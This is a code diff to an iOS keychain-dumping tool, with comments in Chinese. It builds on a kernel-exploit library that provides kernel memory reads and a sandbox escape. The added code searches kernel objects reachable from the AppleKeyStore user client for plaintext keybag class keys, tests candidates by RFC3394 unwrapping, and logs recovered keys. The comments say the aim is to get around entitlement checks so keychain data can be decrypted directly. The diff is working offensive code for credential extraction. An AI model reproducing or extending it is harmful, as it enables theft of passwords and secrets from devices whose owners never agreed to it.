@@ -41,6 +41,8 @@
 #include <copyfile.h>
 #include <mach/mach.h>
 #include <IOKit/IOKitLib.h>
+#include <setjmp.h>
+#include <algorithm>
 
 // 来自 kexploit：判断沙盒逃逸是否生效（仅用于诊断日志）
 // sandbox_escape.m 编译为 C 链接，此处需用 extern "C" 避免 C++ 名字修饰
@@ -270,6 +272,9 @@ public:
         return {};
     }
 
+    // 暴露 io_connect_t 供内核侧探测（方案 B）反查 user client 内核对象。
+    uint64_t connection() const { return (uint64_t)conn_; }
+
 private:
     io_service_t service_ = 0;
     io_connect_t conn_    = 0;
@@ -380,6 +385,139 @@ static std::string HexPrefix(const std::vector<uint8_t>& v, size_t maxBytes) {
     }
     if (v.size() > n) s += "...";
     return s;
+}
+
+// =====================================================================
+// 4.5) 内核侧探测（方案 B）
+//    目的：确认 A15/SEP 上 keybag 的 class/metadata key 是否以明文驻留
+//    AP 内核内存。若可读到，则无需 AKS（绕开 entitlement 限制），直接自己
+//    RFC3394 解包 + AES-CBC 解密即可。
+//
+//    做法：从 AppleKeyStore 的 user client 内核对象出发，BFS 遍历其可达
+//    对象图；对每个对象按 8 字节滑动取 32 字节候选 KEK，用 RFC3394 解包
+//    metadatakeys.data。RFC3394 自带 A6A6.. 完整性校验，解包成功即为强命中
+//    （几乎不可能是巧合）。
+//    所有内核读取均以 soft-abort 包裹：读到未映射页时回滚而非终止进程。
+// =====================================================================
+
+extern "C" uint64_t kread64(uint64_t kaddr);
+extern "C" uint64_t kread_ptr(uint64_t kaddr);
+extern "C" bool     is_kaddr_valid(uint64_t addr);
+extern "C" void     kreadbuf(uint64_t addr, void *buf, uint64_t len);
+extern "C" uint64_t task_self(void);
+extern "C" uint64_t task_get_ipc_port_kobject(uint64_t task, mach_port_t port);
+extern "C" void     kexploit_soft_abort_set(int enabled);
+extern "C" jmp_buf *kexploit_soft_abort_jmp(void);
+
+static std::string Hex64(uint64_t v) {
+    char b[32];
+    snprintf(b, sizeof(b), "0x%016llx", (unsigned long long)v);
+    return std::string(b);
+}
+
+static std::string HexBytes(const uint8_t *p, size_t n) {
+    static const char *H = "0123456789abcdef";
+    std::string s;
+    for (size_t i = 0; i < n; i++) { s += H[p[i] >> 4]; s += H[p[i] & 0xf]; }
+    return s;
+}
+
+// soft-abort 包裹的内核读：地址无效或读到未映射页时返回 false。
+static bool KSafeRead(uint64_t addr, void *buf, size_t len) {
+    if (!is_kaddr_valid(addr)) return false;
+    if (setjmp(*kexploit_soft_abort_jmp()) != 0) {
+        kexploit_soft_abort_set(0);
+        return false;
+    }
+    kexploit_soft_abort_set(1);
+    kreadbuf(addr, buf, len);
+    kexploit_soft_abort_set(0);
+    return true;
+}
+
+static bool AesEcbDecryptBlock(const uint8_t *kek, size_t kekLen,
+                               const uint8_t in[16], uint8_t out[16]) {
+    CCCryptorRef c = nullptr;
+    if (CCCryptorCreate(kCCDecrypt, kCCAlgorithmAES, kCCOptionECBMode,
+                        kek, kekLen, nullptr, &c) != kCCSuccess) return false;
+    size_t moved = 0;
+    CCCryptorStatus st = CCCryptorUpdate(c, in, 16, out, 16, &moved);
+    CCCryptorRelease(c);
+    return st == kCCSuccess && moved == 16;
+}
+
+// RFC 3394 AES Key Unwrap；完整性校验（A6A6..）失败返回空。
+static std::vector<uint8_t> AesKeyUnwrap(const uint8_t *kek, size_t kekLen,
+                                         const std::vector<uint8_t>& wrapped) {
+    if (wrapped.size() < 24 || wrapped.size() % 8 != 0) return {};
+    size_t n = wrapped.size() / 8 - 1;
+    uint8_t a[8];
+    memcpy(a, wrapped.data(), 8);
+    std::vector<uint8_t> r(wrapped.begin() + 8, wrapped.end());
+    for (int j = 5; j >= 0; --j) {
+        for (size_t i = n; i >= 1; --i) {
+            uint64_t t = (uint64_t)n * (uint64_t)j + (uint64_t)i;
+            uint8_t blk[16], dec[16];
+            for (int k = 0; k < 8; ++k)
+                blk[k] = a[k] ^ (uint8_t)(t >> (8 * (7 - k)));
+            memcpy(blk + 8, &r[(i - 1) * 8], 8);
+            if (!AesEcbDecryptBlock(kek, kekLen, blk, dec)) return {};
+            memcpy(a, dec, 8);
+            memcpy(&r[(i - 1) * 8], dec + 8, 8);
+        }
+    }
+    static const uint8_t kIv[8] = {0xA6,0xA6,0xA6,0xA6,0xA6,0xA6,0xA6,0xA6};
+    if (memcmp(a, kIv, 8) != 0) return {};
+    return r;
+}
+
+static void ProbeAKSKeybag(uint64_t conn, const std::vector<uint8_t>& wrappedBlob) {
+    static bool ran = false;
+    if (ran) return;
+    ran = true;
+
+    uint64_t uc = task_get_ipc_port_kobject(task_self(), (mach_port_t)conn);
+    Log("probe: AKS userClient kobject=" + Hex64(uc) +
+        " wrappedLen=" + std::to_string(wrappedBlob.size()));
+    if (!is_kaddr_valid(uc)) { Log("probe: userClient kobject invalid, abort"); return; }
+
+    const size_t OBJ = 0x100;
+    const size_t MAX_NODES = 400;
+    std::vector<uint8_t> buf(OBJ);
+    std::vector<uint64_t> queue{ uc };
+    std::vector<uint64_t> seen{ uc };
+    size_t hits = 0, scanned = 0;
+
+    for (size_t qi = 0; qi < queue.size() && scanned < MAX_NODES; ++qi) {
+        uint64_t obj = queue[qi];
+        if (!KSafeRead(obj, buf.data(), OBJ)) continue;
+        scanned++;
+        Log("probe: obj[" + std::to_string(scanned) + "] " + Hex64(obj) +
+            " = " + HexBytes(buf.data(), 0x20));
+
+        // 候选 KEK：8 字节滑动窗口取 32 字节
+        for (size_t off = 0; off + 32 <= OBJ; off += 8) {
+            auto key = AesKeyUnwrap(buf.data() + off, 32, wrappedBlob);
+            if (!key.empty()) {
+                hits++;
+                Log("probe: *** CANDIDATE KEK HIT *** obj=" + Hex64(obj) +
+                    " off=" + Hex64((uint64_t)off));
+                Log("probe:   kek=" + HexBytes(buf.data() + off, 32));
+                Log("probe:   unwrapped=" + HexBytes(key.data(), key.size()));
+            }
+        }
+
+        // 指针遍历：仅跟进对象内 8 字节对齐、且为合法内核地址的槽
+        for (size_t off = 0; off + 8 <= OBJ; off += 8) {
+            uint64_t p = kread_ptr(obj + off);
+            if (!is_kaddr_valid(p)) continue;
+            if (std::find(seen.begin(), seen.end(), p) != seen.end()) continue;
+            seen.push_back(p);
+            if (queue.size() < MAX_NODES) queue.push_back(p);
+        }
+    }
+    Log("probe: done, nodes=" + std::to_string(scanned) +
+        " candidateHits=" + std::to_string(hits));
 }
 
 // =====================================================================
@@ -504,8 +642,9 @@ static DumpResult DumpKeychain(const std::string& dbPath) {
         throw std::runtime_error("AppleKeyStore client is not available!");
 
     // --- 诊断/等待 keybag 解锁 ---
-    // e00002e2(kIOReturnAborted) 的已知语义是「keychain 锁定或 keybag hibernation 时访问」，
-    // 故先读 lockstate；若锁定则轮询等待用户解锁（否则 unwrap 必然全部失败）。
+    // 注意：unwrap 失败返回 e00002e2 = kIOReturnNotPermitted（调用方权限/entitlement 被拒），
+    // 并非 kIOReturnAborted（0xe00002eb，锁态）。因此 WaitForUnlock 对权限类拒绝无效；
+    // 这里保留 lockstate 诊断，仅用于区分「锁态」与「权限被拒」两种情形。
     {
         int64_t ls = aks.GetLockState();
         Log("keybag initial lockstate=" + std::to_string(ls));
@@ -554,7 +693,13 @@ static DumpResult DumpKeychain(const std::string& dbPath) {
             std::vector<uint8_t> key = aks.UnwrapKey(wrapped, actualKeyclass);
             if (key.empty() && actualKeyclass != keyclass)
                 key = aks.UnwrapKey(wrapped, keyclass);
-            if (!key.empty()) metadataKeys[keyclass] = key;
+            if (!key.empty()) {
+                metadataKeys[keyclass] = key;
+            } else {
+                // AKS 因 entitlement 拒绝（e00002e2）→ 走内核侧探测：
+                // 若 class key 明文驻留内核内存，可绕开 AKS 自行解包。
+                ProbeAKSKeybag(aks.connection(), wrapped);
+            }
         }
         sqlite3_finalize(st);
     }
